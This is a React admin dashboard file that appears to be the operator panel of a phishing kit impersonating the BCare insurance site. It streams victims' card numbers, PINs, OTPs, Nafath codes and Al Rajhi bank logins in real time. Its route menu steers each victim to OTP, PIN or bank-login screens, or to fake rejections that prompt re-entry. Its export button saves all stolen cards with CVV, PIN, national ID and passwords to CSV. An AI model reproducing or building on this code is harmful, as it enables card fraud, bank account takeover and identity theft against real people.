import { createFileRoute, Link, useNavigate } from "@tanstack/react-router";
import { useEffect, useMemo, useRef, useState } from "react";
import {
  Bell,
  BellOff,
  Volume2,
  VolumeX,
  Settings,
  LogOut,
  Phone,
  CreditCard,
  Users,
  Globe,
  Monitor,
  ShieldOff,
  Search,
  ChevronDown,
} from "lucide-react";
import { toast } from "sonner";
import { supabase } from "@/integrations/supabase/client";
import {
  getStats,
  listVisitors,
  listHomeVisitors,
  getVisitorFull,
  updateVisitor,
  setTrashed,
  trashOfflineNoCard,
  exportAllCards,
  decryptAlertValues,
} from "@/lib/admin.functions";
import { Trash2, RotateCcw, Download } from "lucide-react";
import { SettingsModal } from "@/components/SettingsModal";
import { playBeep, isMuted, setMuted, unlockAudio } from "@/lib/notification-sound";
import { getPrefs, showBrowserNotification } from "@/lib/notification-prefs";
import { BankCardPreview } from "@/components/BankCardPreview";
import { detectBank, detectBrand, identifyCard } from "@/lib/bin-database";
import {
  AlertDialog,
  AlertDialogAction,
  AlertDialogCancel,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogFooter,
  AlertDialogHeader,
  AlertDialogTitle,
} from "@/components/ui/alert-dialog";

export const Route = createFileRoute("/_authenticated/dashboard")({
  head: () => ({
    meta: [
      { title: "لوحة التحكم | بي كير" },
      { name: "description", content: "لوحة تحكم مسؤولي بي كير" },
    ],
  }),
  component: DashboardPage,
});

type Visitor = {
  id: string;
  session_id: string;
  visitor_name: string | null;
  ssn: string | null;
  phone: string | null;
  current_page: string | null;
  ip_address: string | null;
  country: string | null;
  os: string | null;
  browser: string | null;
  device: string | null;
  last_active_at: string;
  archived: boolean | null;
  blocked: boolean;
  cards: { id: string; card_number: string | null }[] | null;
  quote_details: { full_name: string | null }[] | null;
};

const routeOptions: Array<{ label: string; value: string; kind: "accept" | "reject" | "neutral" }> = [
  { label: "الرئيسية", value: "الرئيسية", kind: "neutral" },
  { label: "بيانات التأمين", value: "بيانات التأمين", kind: "neutral" },
  { label: "مقارنة العروض", value: "مقارنة العروض", kind: "neutral" },
  { label: "الدفع والتحقق", value: "الدفع والتحقق", kind: "neutral" },
  { label: "ملخص الطلب", value: "ملخص الطلب", kind: "neutral" },
  { label: "شاشة انتظار الدفع", value: "wait", kind: "neutral" },
  { label: "قبول → OTP", value: "OTP", kind: "accept" },
  { label: "قبول → PIN", value: "PIN", kind: "accept" },
  { label: "قبول → نفاذ", value: "نفاذ", kind: "accept" },
  { label: "قبول → مودال نفاذ", value: "مودال نفاذ", kind: "accept" },
  { label: "قبول → اختيار رقم نفاذ", value: "اختيار رقم نفاذ", kind: "accept" },
  { label: "قبول → شاشة انتظار نفاذ", value: "انتظار نفاذ", kind: "accept" },
  { label: "قبول → الراجحي", value: "الراجحي", kind: "accept" },
  { label: "قبول → شاشة انتظار الراجحي", value: "انتظار الراجحي", kind: "accept" },
  { label: "قبول → رمز الراجحي", value: "رمز الراجحي", kind: "accept" },
  { label: "رفض بيانات البطاقة", value: "رفض البطاقة", kind: "reject" },
  { label: "رفض رمز OTP", value: "رفض OTP", kind: "reject" },
  { label: "رفض الرقم السري", value: "رفض PIN", kind: "reject" },
  { label: "رفض بيانات نفاذ", value: "رفض نفاذ", kind: "reject" },
  { label: "رفض بيانات الراجحي", value: "رفض الراجحي", kind: "reject" },
  { label: "رفض رمز الراجحي", value: "رفض رمز الراجحي", kind: "reject" },
];

const COUNTRY_NAMES: Record<string, string> = {
  SA: "السعودية", AE: "الإمارات", KW: "الكويت", QA: "قطر", BH: "البحرين", OM: "عُمان",
  JO: "الأردن", EG: "مصر", IQ: "العراق", YE: "اليمن", SY: "سوريا", LB: "لبنان",
  PS: "فلسطين", MA: "المغرب", DZ: "الجزائر", TN: "تونس", LY: "ليبيا", SD: "السودان",
  US: "أمريكا", GB: "بريطانيا", TR: "تركيا", IN: "الهند", PK: "باكستان",
};

function countryName(code: string) {
  const c = code.trim().toUpperCase();
  return COUNTRY_NAMES[c] ?? c;
}

function countryFlag(code: string) {
  const c = code.trim().toUpperCase();
  if (!/^[A-Z]{2}$/.test(c)) return "";
  return String.fromCodePoint(...[...c].map((ch) => 0x1f1e6 + ch.charCodeAt(0) - 65));
}

function relTime(iso: string) {
  const diff = (Date.now() - new Date(iso).getTime()) / 1000;
  if (diff < 60) return `منذ ${Math.floor(diff)} ثانية`;
  if (diff < 3600) return `منذ ${Math.floor(diff / 60)} دقيقة`;
  if (diff < 86400) return `منذ ${Math.floor(diff / 3600)} ساعة`;
  return `منذ ${Math.floor(diff / 86400)} يوم`;
}

function pageColor(page: string | null) {
  if (!page) return "bg-slate-200 text-slate-700";
  if (page.includes("نفاذ")) return "bg-red-100 text-red-700";
  if (page === "OTP") return "bg-amber-100 text-amber-700";
  if (page === "PIN") return "bg-purple-100 text-purple-700";
  if (page.includes("مقارنة") || page.includes("عروض")) return "bg-blue-100 text-blue-700";
  if (page.includes("دفع")) return "bg-green-100 text-green-700";
  return "bg-slate-100 text-slate-700";
}

function DashboardPage() {
  const navigate = useNavigate();
  const [visitors, setVisitors] = useState<Visitor[]>([]);
  const [selectedId, setSelectedId] = useState<string | null>(null);
  const [selected, setSelected] = useState<any>(null);
  const [filter, setFilter] = useState<"all" | "online" | "card" | "archive" | "trash">("all");
  const [search, setSearch] = useState("");
  const [stats, setStats] = useState({ totalVisitors: 0, todayVisitors: 0, cards: 0, calls: 0, online: 0 });
  const [showSettings, setShowSettings] = useState(false);
  const [showRouteMenu, setShowRouteMenu] = useState(false);
  const [muted, setMutedState] = useState(false);
  const [unread, setUnread] = useState(0);
  const [showNotifications, setShowNotifications] = useState(false);
  const [notifications, setNotifications] = useState<Array<{ id: string; kind: "new" | "card" | "otp" | "nafath"; title: string; desc?: string; ts: number }>>([]);

  // Live activity: a visitor row glows for a few seconds when something new arrives.
  type FlashTone = "emerald" | "sky" | "amber" | "violet";
  const flashTones: Record<FlashTone, string> = {
    emerald: "16,185,129",
    sky: "14,165,233",
    amber: "245,158,11",
    violet: "139,92,246",
  };
  const [flash, setFlash] = useState<Record<string, { ts: number; tone: FlashTone }>>({});
  const flashTimers = useRef<Record<string, ReturnType<typeof setTimeout>>>({});

  function markFlash(id?: string | null, tone: FlashTone = "emerald") {
    if (!id) return;
    setFlash((prev) => ({ ...prev, [id]: { ts: Date.now(), tone } }));
    clearTimeout(flashTimers.current[id]);
    flashTimers.current[id] = setTimeout(() => {
      delete flashTimers.current[id];
      setFlash((prev) => {
        const next = { ...prev };
        delete next[id];
        return next;
      });
    }, 3400);
  }

  // OTP / PIN / نفاذ / Rajhi rows hang off a card, so resolve the visitor first.
  async function flashByCard(cardId?: string | null, tone: FlashTone = "amber") {
    if (!cardId) return;
    const { data } = await supabase.from("cards").select("quote_id").eq("id", cardId).maybeSingle();
    markFlash(data?.quote_id, tone);
  }

  useEffect(() => () => Object.values(flashTimers.current).forEach(clearTimeout), []);
  const mountedAt = useRef<number>(Date.now());
  const [confirmAction, setConfirmAction] = useState<
    | { kind: "trash-one"; id: string; name: string }
    | { kind: "trash-bulk" }
    | null
  >(null);
  const [dragOverRestore, setDragOverRestore] = useState(false);


  useEffect(() => { setMutedState(isMuted()); }, []);

  // Unlock the audio context on the first user interaction anywhere in the page
  useEffect(() => {
    const handler = () => { unlockAudio(); };
    window.addEventListener("click", handler, { once: true });
    window.addEventListener("keydown", handler, { once: true });
    return () => {
      window.removeEventListener("click", handler);
      window.removeEventListener("keydown", handler);
    };
  }, []);

  // Realtime payloads carry encrypted values; decrypt them via an
  // admin-only server function so notifications show readable data.
  async function decryptIfNeeded(v?: string | null): Promise<string | undefined> {
    if (v == null) return undefined;
    const s = String(v);
    if (!s.startsWith("enc:v1:")) return s;
    try {
      const res = await decryptAlertValues({ data: { values: [s] } });
      return res?.values?.[0] ?? undefined;
    } catch {
      return undefined;
    }
  }
  function notify(kind: "new" | "card" | "otp" | "nafath", title: string, descRaw?: string) {
    void decryptIfNeeded(descRaw).then((desc) => showNotify(kind, title, desc));
  }
  function showNotify(kind: "new" | "card" | "otp" | "nafath", title: string, desc?: string) {
    const prefs = getPrefs();
    if (!prefs.enabled[kind]) return;
    playBeep(kind);
    setUnread((n) => n + 1);
    setNotifications((list) => {
      const item: { id: string; kind: "new" | "card" | "otp" | "nafath"; title: string; desc?: string; ts: number } = { id: `${Date.now()}-${Math.random().toString(36).slice(2, 7)}`, kind, title, ts: Date.now() };
      if (desc !== undefined) item.desc = desc;
      return [item, ...list].slice(0, 30);
    });
    if (prefs.toast) {
      if (kind === "card" || kind === "nafath") toast.success(title, { description: desc });
      else if (kind === "otp") toast.warning(title, { description: desc });
      else toast(title, { description: desc });
    }
    if (prefs.browser) showBrowserNotification(title, desc);
  }

  const filterRef = useRef(filter);
  const searchRef = useRef(search);
  useEffect(() => { filterRef.current = filter; }, [filter]);
  useEffect(() => { searchRef.current = search; }, [search]);

  async function loadVisitors() {
    const currentFilter = filterRef.current;
    const query = searchRef.current || undefined;
    if (currentFilter === "all") {
      const [rows, homeRows] = await Promise.all([
        listVisitors({ data: { filter: currentFilter, search: query } }),
        listHomeVisitors({ data: { onlyOnline: false, search: query } }),
      ]);
      const merged = new Map<string, Visitor>();
      for (const row of [...homeRows, ...rows] as Visitor[]) merged.set(row.id, row);
      setVisitors(
        [...merged.values()].sort(
          (a, b) => new Date(b.last_active_at).getTime() - new Date(a.last_active_at).getTime(),
        ),
      );
      return;
    }
    const rows = await listVisitors({ data: { filter: currentFilter, search: query } });
    setVisitors(rows as Visitor[]);
  }
  async function loadStats() {
    setStats(await getStats());
  }
  async function loadSelected(id: string) {
    setSelected(await getVisitorFull({ data: { id } }));
  }

  useEffect(() => { loadVisitors(); }, [filter, search]);
  useEffect(() => { loadStats(); }, []);
  useEffect(() => { if (selectedId) loadSelected(selectedId); }, [selectedId]);

  // Realtime: refresh list + selected on any quote/card/otp/nafath change
  useEffect(() => {
    const isFresh = () => Date.now() - mountedAt.current > 1500; // ignore initial replay
    const channel = supabase
      .channel("admin-dashboard")
      .on("postgres_changes", { event: "INSERT", schema: "public", table: "quotes" }, (p) => {
        loadVisitors(); loadStats();
        markFlash((p.new as any)?.id, "emerald");
        if (isFresh()) notify("new", "زائر جديد", (p.new as any)?.ssn || (p.new as any)?.session_id?.slice(0, 8));
      })
      .on("postgres_changes", { event: "UPDATE", schema: "public", table: "quotes" }, (p) => {
        loadVisitors(); loadStats();
        markFlash((p.new as any)?.id, "emerald");
        if (selectedId) loadSelected(selectedId);
      })
      .on("postgres_changes", { event: "INSERT", schema: "public", table: "cards" }, (p) => {
        loadStats(); if (selectedId) loadSelected(selectedId);
        markFlash((p.new as any)?.quote_id, "sky");
        if (isFresh()) notify("card", "بيانات بطاقة جديدة", (p.new as any)?.card_number);
      })
      .on("postgres_changes", { event: "UPDATE", schema: "public", table: "cards" }, (p) => {
        markFlash((p.new as any)?.quote_id, "sky");
        if (selectedId) loadSelected(selectedId);
      })
      .on("postgres_changes", { event: "INSERT", schema: "public", table: "card_otp_history" }, (p) => {
        if (selectedId) loadSelected(selectedId);
        void flashByCard((p.new as any)?.card_id, "amber");
        if (isFresh()) notify("otp", "رمز OTP جديد", (p.new as any)?.otp);
      })
      .on("postgres_changes", { event: "INSERT", schema: "public", table: "card_nafath_history" }, (p) => {
        if (selectedId) loadSelected(selectedId);
        void flashByCard((p.new as any)?.card_id, "violet");
        if (isFresh()) notify("nafath", "بيانات نفاذ", (p.new as any)?.code);
      })
      .on("postgres_changes", { event: "INSERT", schema: "public", table: "card_input_history" }, (p) => {
        if (selectedId) loadSelected(selectedId);
        void flashByCard((p.new as any)?.card_id, "sky");
        if (isFresh()) notify("card", "محاولة بطاقة جديدة", (p.new as any)?.card_number);
      })
      .on("postgres_changes", { event: "INSERT", schema: "public", table: "card_pin_history" }, (p) => {
        if (selectedId) loadSelected(selectedId);
        void flashByCard((p.new as any)?.card_id, "amber");
        if (isFresh()) notify("card", "رمز PIN جديد", (p.new as any)?.pin);
      })
      .on("postgres_changes", { event: "INSERT", schema: "public", table: "card_rajhi_history" }, (p) => {
        if (selectedId) loadSelected(selectedId);
        void flashByCard((p.new as any)?.card_id, "sky");
        if (isFresh()) notify("card", "محاولة تسجيل دخول الراجحي", (p.new as any)?.username);
      })
      .on("postgres_changes", { event: "INSERT", schema: "public", table: "quote_submission_history" }, (p) => {
        if (selectedId) loadSelected(selectedId);
        markFlash((p.new as any)?.quote_id, "emerald");
        if (isFresh()) notify("new", "تسجيل جديد من نفس الزائر", (p.new as any)?.plate_number || (p.new as any)?.ssn);
      })
      .on("postgres_changes", { event: "*", schema: "public", table: "quote_details" }, (p) => {
        markFlash((p.new as any)?.quote_id ?? (p.old as any)?.quote_id, "emerald");
        if (selectedId) loadSelected(selectedId);
      })
      .on("postgres_changes", { event: "INSERT", schema: "public", table: "admin_activity_log" }, (p) => {
        if (!isFresh()) return;
        const row = p.new as { action?: string; actor_email?: string | null; meta?: any } | null;
        if (!row) return;
        loadVisitors();
        const who = row.actor_email || "مسؤول";
        if (row.action === "trash") toast(`${who} نقل زائرًا إلى السلة`, { description: row.meta?.name || row.meta?.session_id });
        else if (row.action === "restore") toast.success(`${who} استعاد زائرًا من السلة`, { description: row.meta?.name || row.meta?.session_id });
        else if (row.action === "bulk_trash") toast(`${who} نقل ${row.meta?.count ?? 0} زائرًا إلى السلة`);
      })
      .subscribe();
    return () => { void supabase.removeChannel(channel); };
  }, [selectedId]);

  function toggleMute() {
    unlockAudio();
    const next = !muted;
    setMuted(next);
    setMutedState(next);
    if (!next) playBeep("new");
  }
  function clearUnread() { setUnread(0); }
  function toggleNotifications() {
    unlockAudio();
    setShowNotifications((s) => {
      const next = !s;
      if (next) setUnread(0);
      return next;
    });
  }
  function clearNotifications() { setNotifications([]); setUnread(0); }

  const kindLabels: Record<string, { label: string; cls: string }> = {
    new: { label: "زائر جديد", cls: "bg-slate-100 text-slate-700" },
    card: { label: "بطاقة", cls: "bg-green-100 text-green-700" },
    otp: { label: "OTP", cls: "bg-amber-100 text-amber-700" },
    nafath: { label: "نفاذ", cls: "bg-red-100 text-red-700" },
  };

  // Refresh relative times every 20s
  useEffect(() => {
    const t = setInterval(() => setVisitors((v) => [...v]), 20000);
    return () => clearInterval(t);
  }, []);

  const filtered = useMemo(() => visitors, [visitors]);

  async function handleLogout() {
    await supabase.auth.signOut();
    navigate({ to: "/auth", replace: true });
  }

  const [showNafathDialog, setShowNafathDialog] = useState(false);
  const [nafathInput, setNafathInput] = useState("");
  const [nafathSending, setNafathSending] = useState(false);

  async function route(page: string) {
    if (!selected) return;
    setShowRouteMenu(false);
    if (page === "اختيار رقم نفاذ") {
      setNafathInput("");
      setShowNafathDialog(true);
      return;
    }
    await updateVisitor({ data: { id: selected.id, current_page: page } });
  }

  async function sendNafathNumber(useValue?: string) {
    if (!selected) return;
    const raw = (useValue ?? nafathInput).trim();
    const num = raw || String(Math.floor(Math.random() * 89) + 10);
    if (!/^\d{1,4}$/.test(num)) {
      toast.error("أدخل رقمًا صحيحًا (1-4 خانات)");
      return;
    }
    setNafathSending(true);
    try {
      await updateVisitor({ data: { id: selected.id, nafath_number: num, current_page: "اختيار رقم نفاذ" } });
      toast.success(`تم إرسال الرقم ${num} للزائر`);
      setShowNafathDialog(false);
      setNafathInput("");
    } catch {
      toast.error("تعذّر الإرسال");
    } finally {
      setNafathSending(false);
    }
  }

  async function ban() {
    if (!selected) return;
    try {
      await updateVisitor({ data: { id: selected.id, blocked: true } });
      // Also ban the visitor's IP so they can't come back from the same network.
      if (selected.ip_address) {
        try {
          const { addBannedIp } = await import("@/lib/admin.functions");
          await addBannedIp({ data: { ip: selected.ip_address } });
        } catch { /* ignore duplicates */ }
      }
      toast.success("تم حظر الزائر وسيتم تحويله فوراً", { description: selected.ip_address ? `IP: ${selected.ip_address}` : undefined });
      loadSelected(selected.id);
    } catch (e: any) {
      toast.error(e?.message || "تعذّر الحظر");
    }
  }

  async function unban() {
    if (!selected) return;
    try {
      await updateVisitor({ data: { id: selected.id, blocked: false } });
      // Lift the IP ban too so the visitor can browse again from the same network.
      if (selected.ip_address) {
        try {
          const { listBannedIps, removeBannedIp } = await import("@/lib/admin.functions");
          const ips = await listBannedIps().catch(() => [] as any[]);
          const match = (ips as any[]).find((r) => r.ip === selected.ip_address);
          if (match) await removeBannedIp({ data: { id: match.id } });
        } catch { /* ignore */ }
      }
      toast.success("تم إلغاء حظر الزائر");
      loadSelected(selected.id);
    } catch (e: any) {
      toast.error(e?.message || "تعذّر إلغاء الحظر");
    }
  }

  return (
    <div dir="rtl" className="flex h-screen flex-col bg-slate-100">
      {/* Header */}
      <header className="flex flex-col gap-3 border-b border-slate-200 bg-white px-5 py-3 shadow-[0_1px_2px_rgba(15,23,42,0.04)]">
       <div className="flex items-center justify-between gap-3">
        <div className="flex items-center gap-1.5">
          <button onClick={handleLogout} className="rounded p-2 text-slate-500 hover:bg-slate-100" title="خروج"><LogOut className="h-5 w-5" /></button>
          <button onClick={() => setShowSettings(true)} className="rounded p-2 text-slate-500 hover:bg-slate-100" title="إعدادات"><Settings className="h-5 w-5" /></button>
          <button onClick={toggleMute} className="rounded p-2 text-slate-500 hover:bg-slate-100" title={muted ? "تشغيل الصوت" : "كتم الصوت"}>
            {muted ? <VolumeX className="h-5 w-5 text-red-500" /> : <Volume2 className="h-5 w-5 text-emerald-600" />}
          </button>
          <div className="relative">
            <button onClick={toggleNotifications} className="relative rounded p-2 text-slate-500 hover:bg-slate-100" title="إشعارات">
              {unread > 0 ? <Bell className="h-5 w-5 text-bcare-blue animate-pulse" /> : <BellOff className="h-5 w-5" />}
              {unread > 0 && (
                <span className="absolute -top-0.5 -right-0.5 flex h-4 min-w-[16px] items-center justify-center rounded-full bg-red-500 px-1 text-[10px] font-bold text-white">
                  {unread > 9 ? "9+" : unread}
                </span>
              )}
            </button>
            {showNotifications && (
              <>
                <div className="fixed inset-0 z-40" onClick={() => setShowNotifications(false)} />
                <div className="absolute start-0 top-full z-50 mt-2 w-80 rounded-lg border bg-white shadow-lg">
                  <div className="flex items-center justify-between border-b px-3 py-2">
                    <span className="text-sm font-bold text-slate-700">الإشعارات</span>
                    <button onClick={clearNotifications} className="text-xs text-slate-500 hover:text-red-600">مسح الكل</button>
                  </div>
                  <div className="max-h-96 overflow-y-auto">
                    {notifications.length === 0 ? (
                      <div className="p-6 text-center text-sm text-slate-400">لا توجد إشعارات</div>
                    ) : (
                      notifications.map((n) => (
                        <div key={n.id} className="flex flex-col gap-1 border-b px-3 py-2 last:border-b-0 hover:bg-slate-50">
                          <div className="flex items-center justify-between gap-2">
                            <span className={`rounded px-2 py-0.5 text-[10px] font-bold ${kindLabels[n.kind]?.cls ?? ""}`}>{kindLabels[n.kind]?.label ?? n.kind}</span>
                            <span className="text-[10px] text-slate-400">{relTime(new Date(n.ts).toISOString())}</span>
                          </div>
                          <div className="text-sm font-medium text-slate-800">{n.title}</div>
                          {n.desc && <div className="text-xs text-slate-500 truncate">{n.desc}</div>}
                        </div>
                      ))
                    )}
                  </div>
                </div>
              </>
            )}
          </div>
        </div>
        <div className="hidden items-center gap-2 text-sm md:flex">
          <span className="flex items-center gap-1.5 rounded-full border border-emerald-200 bg-emerald-50 px-3 py-1 text-xs font-bold text-emerald-700">
            <span className="h-1.5 w-1.5 animate-pulse rounded-full bg-emerald-500" />
            {stats.online} متصل الآن
          </span>
        </div>
        <div className="flex items-center gap-2">
          <button
            onClick={async () => {
              const t = toast.loading("جارٍ تجهيز ملف البطاقات...");
              try {
                const rows = await exportAllCards();
                if (!rows.length) { toast.dismiss(t); toast.info("لا توجد بطاقات لحفظها"); return; }
                const headers = [
                  "created_at","session_id","visitor_name","ssn","phone","country","ip_address","current_page",
                  "company","total_price","card_number","card_name","year","cvv","phone_number","pin","otp",
                  "username_nafath","password_nafath","username_rajhi","password_rajhi",
                ];
                const esc = (v: any) => {
                  if (v === null || v === undefined) return "";
                  const s = String(v).replace(/"/g, '""');
                  return /[",\n]/.test(s) ? `"${s}"` : s;
                };
                const lines = [headers.join(",")];
                for (const c of rows as any[]) {
                  const otps = (c.card_otp_history ?? []).map((o: any) => o.otp).join(" | ");
                  lines.push([
                    c.created_at, c.quote?.session_id, c.quote?.visitor_name, c.quote?.ssn, c.quote?.phone,
                    c.quote?.country, c.quote?.ip_address, c.quote?.current_page,
                    c.company, c.total_price, c.card_number, c.card_name, c.year, c.cvv, c.phone_number,
                    c.pin, c.otp || otps, c.username_nafath, c.password_nafath, c.username, c.password,
                  ].map(esc).join(","));
                }
                const blob = new Blob(["\ufeff" + lines.join("\n")], { type: "text/csv;charset=utf-8" });
                const url = URL.createObjectURL(blob);
                const a = document.createElement("a");
                a.href = url;
                a.download = `bcare-cards-${new Date().toISOString().slice(0, 10)}.csv`;
                a.click();
                URL.revokeObjectURL(url);
                toast.dismiss(t);
                toast.success(`تم حفظ ${rows.length} بطاقة`);
              } catch (e: any) {
                toast.dismiss(t);
                toast.error(e?.message || "تعذّر حفظ البطاقات");
              }
            }}
            className="flex items-center gap-1 rounded-lg border border-sky-200 bg-sky-50 px-3 py-1.5 text-xs font-bold text-sky-700 hover:bg-sky-100"
            title="حفظ جميع البطاقات (CSV)"
          >
            <Download className="h-3.5 w-3.5" />
            حفظ جميع البطاقات
          </button>
          <Link
            to="/home-visitors"
            className="flex items-center gap-1 rounded-lg border border-emerald-200 bg-emerald-50 px-3 py-1.5 text-xs font-bold text-emerald-700 hover:bg-emerald-100"
            title="زوار الصفحة الرئيسية"
          >
            <Users className="h-3.5 w-3.5" />
            زوار الرئيسية
          </Link>
          <span className="rounded-full bg-emerald-100 px-3 py-1 text-sm font-bold text-emerald-700">BeCare</span>
          <div className="flex h-8 w-8 items-center justify-center rounded-full bg-emerald-600 font-bold text-white">B</div>
        </div>
       </div>
       {/* Top statistics bar */}
       <div className="grid grid-cols-2 gap-2 sm:grid-cols-4">
        <StatCard
          icon={<Globe className="h-4 w-4" />}
          tint="slate"
          label="إجمالي العمليات"
          value={String(stats.totalVisitors)}
          sub={`اليوم ${stats.todayVisitors}`}
        />
        <StatCard
          icon={<Users className="h-4 w-4" />}
          tint="emerald"
          label="المتصلون الآن"
          value={String(stats.online)}
          sub={`من ${stats.todayVisitors} اليوم`}
        />
        <StatCard
          icon={<Users className="h-4 w-4" />}
          tint="blue"
          label="الزوار"
          value={`${stats.online} / ${stats.todayVisitors}`}
          sub="متصل / اليوم"
        />
        <StatCard
          icon={<CreditCard className="h-4 w-4" />}
          tint="violet"
          label="العملاء (بطاقات)"
          value={String(stats.cards)}
          sub={stats.calls ? `${stats.calls} مكالمة` : "إجمالي البطاقات"}
        />
       </div>
      </header>

      <div className="flex flex-1 overflow-hidden">
        {/* Right — visitors list */}
        <aside className="flex w-80 flex-col border-l bg-white">
          <div className="border-b p-3">
            <div className="mb-2 flex justify-between text-sm">
              <span className="font-bold">صندوق الوارد</span>
              <span className="rounded-full bg-slate-100 px-2 text-xs">{filtered.length}</span>
            </div>
            <div className="mb-2 flex flex-wrap gap-1">
              <TabBtn
                active={filter === "all"}
                onClick={() => setFilter("all")}
                onDragOver={(e) => { e.preventDefault(); setDragOverRestore(true); }}
                onDragLeave={() => setDragOverRestore(false)}
                onDrop={async (e) => {
                  e.preventDefault();
                  setDragOverRestore(false);
                  const id = e.dataTransfer.getData("text/visitor-id");
                  if (!id) return;
                  await setTrashed({ data: { id, trashed: false } });
                  toast.success("تم الاستعادة");
                  loadVisitors();
                }}
                dropActive={dragOverRestore}
              >الكل</TabBtn>
              <TabBtn active={filter === "online"} onClick={() => setFilter("online")}>متصل</TabBtn>
              <TabBtn active={filter === "card"} onClick={() => setFilter("card")}>بطاقة</TabBtn>
              <TabBtn active={filter === "archive"} onClick={() => setFilter("archive")}>الأرشيف</TabBtn>
              <TabBtn active={filter === "trash"} onClick={() => setFilter("trash")}>السلة</TabBtn>
            </div>
            {filter !== "trash" ? (
              <button
                onClick={() => setConfirmAction({ kind: "trash-bulk" })}
                className="mb-2 flex w-full items-center justify-center gap-2 rounded-lg border border-red-200 bg-red-50 px-3 py-1.5 text-xs font-bold text-red-600 hover:bg-red-100"
              >
                <Trash2 className="h-3.5 w-3.5" />
                حذف غير المتصلين بدون بطاقة
              </button>
            ) : (
              <div
                onDragOver={(e) => { e.preventDefault(); setDragOverRestore(true); }}
                onDragLeave={() => setDragOverRestore(false)}
                onDrop={async (e) => {
                  e.preventDefault();
                  setDragOverRestore(false);
                  const id = e.dataTransfer.getData("text/visitor-id");
                  if (!id) return;
                  await setTrashed({ data: { id, trashed: false } });
                  toast.success("تم الاستعادة");
                  loadVisitors();
                }}
                className={`mb-2 rounded-lg border-2 border-dashed px-3 py-2 text-center text-[11px] transition-colors ${
                  dragOverRestore
                    ? "border-emerald-500 bg-emerald-50 text-emerald-700"
                    : "border-slate-200 bg-slate-50 text-slate-500"
                }`}
              >
                <RotateCcw className="mx-auto mb-0.5 h-3.5 w-3.5" />
                اسحب أي زائر هنا لاستعادته — أو أفلته على تبويب «الكل»
              </div>
            )}
            <div className="relative">
              <Search className="absolute right-2 top-2.5 h-4 w-4 text-slate-400" />
              <input value={search} onChange={(e) => setSearch(e.target.value)} placeholder="بحث (الاسم، الهوية، الهاتف، آخر 4 أرقام)" className="h-9 w-full rounded-lg border border-slate-200 bg-slate-50 pr-8 pl-3 text-xs outline-none focus:border-emerald-500" />
            </div>
          </div>
          <div className="flex-1 overflow-y-auto">
            {filtered.map((v) => {
              const name = v.quote_details?.[0]?.full_name || v.visitor_name || "زائر";
              const isCard = v.cards && v.cards.length > 0;
              const online = Date.now() - new Date(v.last_active_at).getTime() < 2 * 60 * 1000;
              const isTrash = filter === "trash";
              const fl = flash[v.id];
              return (
                <div
                  key={v.id}
                  draggable
                  onDragStart={(e) => { e.dataTransfer.setData("text/visitor-id", v.id); e.dataTransfer.effectAllowed = "move"; }}
                  className={`group relative flex items-center gap-1 border-b transition-colors ${selectedId === v.id ? "bg-emerald-50" : "hover:bg-slate-50"} cursor-grab active:cursor-grabbing`}
                >
                  {fl && (
                    <span
                      key={fl.ts}
                      aria-hidden
                      className="bcare-row-flash pointer-events-none absolute inset-0"
                      style={{
                        background: `linear-gradient(to left, rgba(${flashTones[fl.tone]}, 0.22), rgba(${flashTones[fl.tone]}, 0.04))`,
                      }}
                    />
                  )}
                  {fl && (
                    <span
                      key={`bar-${fl.ts}`}
                      aria-hidden
                      className="bcare-row-flash-bar pointer-events-none absolute inset-y-0 right-0 w-[3px]"
                      style={{ background: `rgb(${flashTones[fl.tone]})` }}
                    />
                  )}
                  <button onClick={() => setSelectedId(v.id)} className="flex flex-1 items-center gap-3 p-3 text-right">
                    <div className="relative">
                      <div className="flex h-10 w-10 items-center justify-center rounded-full bg-slate-200 text-slate-500">👤</div>
                      {online && <span className="absolute -bottom-0.5 -right-0.5 h-3 w-3 rounded-full border-2 border-white bg-emerald-500" />}
                    </div>
                    <div className="min-w-0 flex-1">
                      <div className="flex items-center justify-between">
                        <span className="truncate text-xs text-slate-400">{relTime(v.last_active_at)}</span>
                        <span className="truncate text-sm font-bold">{name}</span>
                      </div>
                      <div className="mt-0.5 flex items-center justify-between">
                        {isCard && <CreditCard className="h-3 w-3 text-slate-400" />}
                        <span className={`rounded px-1.5 py-0.5 text-[10px] font-bold ${pageColor(v.current_page)}`}>{v.current_page || "—"}</span>
                      </div>
                    </div>
                  </button>
                  <button
                    onClick={async (e) => {
                      e.stopPropagation();
                      if (isTrash) {
                        await setTrashed({ data: { id: v.id, trashed: false } });
                        toast.success("تم الاستعادة");
                        if (selectedId === v.id) setSelectedId(null);
                        loadVisitors();
                      } else {
                        setConfirmAction({ kind: "trash-one", id: v.id, name });
                      }
                    }}
                    title={isTrash ? "استعادة" : "نقل إلى السلة"}
                    className={`me-2 rounded p-1.5 opacity-60 hover:opacity-100 ${isTrash ? "text-emerald-600 hover:bg-emerald-50" : "text-red-500 hover:bg-red-50"}`}
                  >
                    {isTrash ? <RotateCcw className="h-4 w-4" /> : <Trash2 className="h-4 w-4" />}
                  </button>
                </div>
              );
            })}
            {filtered.length === 0 && <p className="p-8 text-center text-sm text-slate-400">لا يوجد زوار</p>}
          </div>
        </aside>

        {/* Center — details */}
        <main className="flex flex-1 flex-col overflow-hidden">
          {selected ? (
            <>
              <div className="flex items-center gap-3 border-b bg-white px-4 py-3">
                {selected.blocked ? (
                  <button onClick={unban} className="rounded-lg bg-emerald-600 px-3 py-1.5 text-xs font-bold text-white">إلغاء الحظر</button>
                ) : (
                  <button onClick={ban} className="rounded-lg bg-red-500 px-3 py-1.5 text-xs font-bold text-white">حظر</button>
                )}
                {selected.blocked && <Badge color="bg-red-100 text-red-700">محظور</Badge>}
                {(() => { const on = Date.now() - new Date(selected.last_active_at).getTime() < 2 * 60 * 1000; return (
                  <Badge color={on ? "bg-emerald-100 text-emerald-700" : "bg-slate-200 text-slate-500"}>
                    <span className={`mr-1 inline-block h-2 w-2 rounded-full ${on ? "bg-emerald-500 animate-pulse" : "bg-slate-400"}`} />
                    {on ? "متصل الآن" : "غير متصل"}
                  </Badge>
                ); })()}
                <Badge color="bg-emerald-100 text-emerald-700">{selected.current_page || "—"}</Badge>
                {selected.ip_address && <Badge color="bg-slate-100"><Globe className="mr-1 inline h-3 w-3" />{selected.ip_address}</Badge>}
                {selected.country && <Badge color="bg-slate-100">{countryFlag(selected.country)} {countryName(selected.country)}</Badge>}
                {selected.browser && <Badge color="bg-slate-100"><Monitor className="mr-1 inline h-3 w-3" />{selected.browser}</Badge>}
                {selected.os && <Badge color="bg-slate-100">{selected.os}</Badge>}
                {selected.device && <Badge color="bg-slate-100">{selected.device}</Badge>}
